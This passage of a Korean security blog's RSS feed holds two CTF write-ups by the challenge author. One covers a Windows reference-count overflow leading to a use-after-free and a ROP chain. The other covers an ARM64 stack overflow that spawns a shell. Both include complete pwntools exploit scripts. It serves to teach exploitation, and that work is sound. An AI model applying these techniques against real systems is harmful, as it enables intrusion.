      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ&lt;/p&gt;
&lt;p&gt;idioth형이 대회 중간에 0솔</description>
        
      
      
      
      <content:encoded><![CDATA[<p>처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ</p><p>idioth형이 대회 중간에 0솔버를 위한 선물이라고 짤을 하나 보내줬는데…</p><p><img src="/2020/12/29/l0ch/address_book/1.png"></p><blockquote><p>즌쯔… 느므 그믑느…^^</p></blockquote><p>그래도 대회 12시간만에 다행히 솔버가 나와서 다행이라고 생각합니다 ㅎㅎ.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>먼저, 문제 환경부터 보시죠</p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit 윈도우 10 환경이며, 보호기법은 모두 걸려있네요!</p><p>어떤 기능들이 있는지 보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/2.png"></p><ol><li><p>Add address Info</p><p>name, address, city를 입력받고 address info를 추가</p></li><li><p>Address Info List</p><p>추가한 address info들을 출력</p></li><li><p>Delete address Info</p><p>address info를 삭제. 이 때 삭제된 info는 Recycle Bin List에 추가</p></li><li><p>Restore address Info</p><p>삭제된 info를 원래 List로 복구</p></li><li><p>Modify address Info</p><p>수정할 address info를 선택해 name, address, city를 수정 가능</p></li><li><p>Empty List</p><p>address list와 recycle bin list 항목을 모두 삭제</p></li><li><p>Exit</p></li></ol><p>7번으로 종료하면</p><p><img src="/2020/12/29/l0ch/address_book/3.png"></p><p>list가 저장되었다고 뜨는데, 옆에 메모리 주소로 보이는 값이 존재합니다.</p><p>리스트는 double linked list로 구현되어 있으며 처음에 <code>Address Book</code>, <code>Recycle Bin</code> 두개의 객체가 할당되어 각각 2byte 정수 type의 reference count (초기값=10)를 가집니다. 함수가 객체를 참조할 때 count가 10 올라가며 해당 함수를 빠져나올때 count가 10 감소하고 10보다 작으면 할당된 객체를 free하고 객체의 주소를 출력합니다.</p><p>감이 오시죠. C++의 공유포인터 <code>std::shared_ptr</code> 를 커스텀 구현한 문제입니다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>의 info를 restore할때 복구하는 노드에서, <code>Recycle Bin</code>에서 사용한 next 값이 초기화되지 않고 남아있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/4.png"><br>노드를 네 개 생성한 뒤 4, 3을 차례대로 삭제하면 Recycle Bin 리스트에 순서대로 들어갑니다.</p><p><img src="/2020/12/29/l0ch/address_book/5.png"></p><p>Restore 4로 <code>Address List</code>로 복구했을때 node 4의 next 가 초기화되지 않고 여전히 <code>Recycle Bin</code>의 3을 가리킵니다.</p><p><img src="/2020/12/29/l0ch/address_book/6.png"></p><p>Restore 3을 하면 <code>Address List</code>에 index 순서에 맞게 2와 4 사이에 삽입되고 결과적으로 다음과 같이 3과 4의 next가 각각 서로를 가리키게 되어 순환적인 구조를 가진 리스트를 만들 수 있습니다.</p><p><code>Address List</code>의 노드들을 출력하는 함수는 노드의 next가 NULL일때까지 혹은 입력한 수만큼 재귀호출을 통해 head 노드부터 출력합니다. 이때 입력한 수를 검증하지 않아 reference counter의  integer overflow가 발생할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/7.png"><br>재귀함수의 인자로 <code>Address List</code>의 포인터가 들어가는데, 재귀함수가 한 번 호출될때마다 <code>Address List</code>의 reference count가 10씩 증가합니다. </p><p>위와 같이 취약점을 트리거했을 때 정확히 3275만큼 재귀로 참조하면 2byte 정수 조건을 벗어나게 되어 free 조건인 <code>reference count &lt; 10</code> 을 만족하게 되고 AddressBook 포인터가 한 번 free됩니다.  </p><p>이어 Add Address Info에서 노드를 새로 할당하는 것으로 UAF를 트리거할 수 있어 Address Info에서 <code>name</code> 으로 vtable 을 overwrite 해 eip control이 가능합니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>바이너리에서 <code>flag.txt</code>를 open했으니 <code>read</code>와 <code>write</code>로 flag 내용을 출력하기만 하면 됩니다.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROP에 필요한 건 다음과 같습니다.</p><p><code>ntdll.dll</code> base address → gadget</p><p><code>ucrtbase.dll</code> base address → <code>read</code>, <code>write</code></p><p>위 주소들을 구하기 위해서 먼저 바이너리의 imagebase부터 leak해야 합니다.</p><p>UAF 이후 leak은 Address Info를 출력할 때 <code>head</code> 포인터 값에서부터 참조하는 것을 이용해 Address Info의 <code>city+16</code> 에서 <code>head</code> 포인터를 overwrite → OOB read가 가능한 점을 이용합니다.</p><p><img src="/2020/12/29/l0ch/address_book/8.png"></p><p>몇번 실행해보면 객체간 offset 에 패턴이 있습니다. offset을 계산해서 city+16 에 Recycle Bin의 주소로 head 를 overwrite하고 2번 메뉴로 출력하면 vtable 주소를 구할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/9.png"></p><p><code>Recycle Bin</code>의 vtable offset은 0x6960이니 leak한 vtable에 offset만큼 빼면 imagebase가 나오겠군요!</p><p>이제 imagebase를 구했으니 dll 주소를 구하는건 쉽습니다!</p><p>구하고싶은 dll의 아무 함수나 IAT 테이블에서 offset을 찾고, imagebase+offset 주소에 존재하는 dll 함수 주소를 leak하면 되죠. <code>ntdll</code>부터 구해보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/10.png"></p><p><code>!dh imagebase</code> 로 IAT offset을 찾고 Import된 dll 함수를 찾아볼게요</p><p><img src="/2020/12/29/l0ch/address_book/11.png"></p><p><code>ntdll!RtlInitializeSListHead</code> 가 imagebase+ 0x6060에 있네요.</p><p><code>ucrtbase!free</code> 도 imagebase + 0x61f0 인걸 확인할 수 있습니다.</p><p>vtable을 leak했을 때와 같은 방법으로 <code>head</code>를 overwrite해 해당 메모리에 있는 값을 출력하고 각각 dll 내 offset을 빼주면 dll base address를 구할 수 있습니다!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># 전체 코드는 아래 Exploit Code 참조</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png"></p><p>이제 필요한 주소들도 모두 구했고 eip도 컨트롤할 수 있으니, ROP chain만 구성하면 됩니다.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> 로 rsp를 현재 페이로드가 올라와 있는 주소로 pivot 한뒤 <code>read</code>, <code>write</code>를 차례로 호출하면 flag를 출력할 수 있습니다!</p><p><img src="/2020/12/29/l0ch/address_book/13.png"></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))p.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/write-up/">write-up</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf/">christmas ctf</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - baby-RudOlPh</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.&lt;br&gt;&lt;img src=&quot;/2020/12/29/l0ch/baby_rudolph/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;바이너리를 받고</description>
        
      
      
      
      <content:encoded><![CDATA[<p>baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png"></p><p>바이너리를 받고 보호기법과 아키텍쳐를 확인해보면 64bit ARM이고, NX bit만 걸려있는걸 확인할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png"><br>분석해보면 vuln이라는 함수를 대놓고 줍니다. read 함수를 호출하는데 0x100만큼 받아서 stack overwflow가 발생하네요</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png"></p><p><code>get_arm</code> 함수를 보면 첫 번째 인자의 값이 <code>0x1225</code> 면 <code>system(&quot;/bin/sh&quot;)</code>을 실행해 쉘을 획득할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png"></p><p><code>ARMmaker</code> 함수에는 인자를 세팅 할 수 있는 gadget이 있네요.</p><ol><li><code>vuln</code> 의 return address를 <code>ARMmaker</code>의 gadget으로 overwrite</li><li>gadget을 통해 인자를 <code>0x1225</code>로 세팅하고 <code>get_arm</code> 호출</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png"></p><p>뉴비용 포너블 문제를 내려는데 그냥 내면 심심해서 64bit ARM으로 내봤습니다 ㅎㅎ 역시 많은 분들이 풀어주셨습니다! </p><p>(문제 만드는 시간보다 도커에 세팅하는데 드는 시간이 더 오래 걸렸던 건 비밀..)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/write-up/">write-up</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf/">christmas ctf</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
